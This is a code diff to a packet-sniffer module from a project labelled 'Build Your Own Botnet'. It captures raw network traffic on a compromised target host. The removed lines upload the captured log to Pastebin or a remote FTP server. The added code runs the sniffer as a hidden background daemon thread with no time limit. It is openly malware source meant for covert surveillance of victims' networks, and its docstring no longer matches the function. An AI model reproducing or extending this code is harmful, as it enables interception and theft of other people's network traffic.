@@ -3,26 +3,24 @@
 'Packet Sniffer (Build Your Own Botnet)'
 
 # standard libarary
-import os
-import sys
-import imp
 import time
 import struct
 import socket
-import urllib
 import binascii
 import StringIO
+import threading
 
 # utilities
-import core.util as util
+import util
 
 # globals
 packages = []
 platforms = ['linux2','darwin']
 results = {}
 log = StringIO.StringIO()
-usage  = 'packetsniffer [seconds]'
-desription = """ 
+flag = threading.Event()
+usage  = 'packetsniffer [mode]'
+desription = """
 Capture packets on the target client host machine's local network
 and optionally upload them to Pastebin or to a remote FTP server
 """
@@ -141,36 +139,40 @@ def _eth_header(data):
     except Exception as e:
         globals()['log'].write("\nError in {} header: '{}'".format('ETH', str(e)))
 
-def run(mode, seconds=30):
-    """ 
-    Monitor the host network and capture packets
-
-    `Optional`
-    :param int seconds:    duration in seconds (default: 30)
-
-    """
+def _run():
+    global flag
     try:
-        if mode not in ('pastebin','ftp'):
-            return "Error: invalid upload mode '%s'" % str(mode)
-	if not isinstance(seconds, int):
-            return "Error: keyword argument 'seconds' must be an integer"
         sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-        while time.clock() < seconds:
+        while True:
+            flag.wait()
             try:
                 recv_data = sniffer_socket.recv(2048)
-                recv_data, ip_bool = packetsniffer_eth_header(recv_data)
+                recv_data, ip_bool = _eth_header(recv_data)
                 if ip_bool:
-                    recv_data, ip_proto = packetsniffer_ip_header(recv_data)
+                    recv_data, ip_proto = _ip_header(recv_data)
                     if ip_proto == 6:
-                        recv_data = packetsniffer_tcp_header(recv_data)
+                        recv_data = _tcp_header(recv_data)
                     elif ip_proto == 17:
-                        recv_data = packetsniffer_udp_header(recv_data)
+                        recv_data = _udp_header(recv_data)
             except Exception as e:
                 util.log(str(e))
                 break
         try:
             sniffer_socket.close()
         except: pass
-        results[time.ctime()] = util.pastebin(globals()['log']) if 'ftp' not in mode else util.ftp(globals()['log'], filetype='.pcap')
     except Exception as e:
-        util.log("{} error: {}".format(packetsniffer.func_name, str(e)))
+        util.log(str(e))
+
+
+def run():
+    """
+    Monitor the host network and capture packets
+
+    `Optional`
+    :param int seconds:    duration in seconds (default: 30)
+
+    """
+    t = threading.Thread(target=_run, name=time.time())
+    t.daemon = True
+    t.start()
+    return t
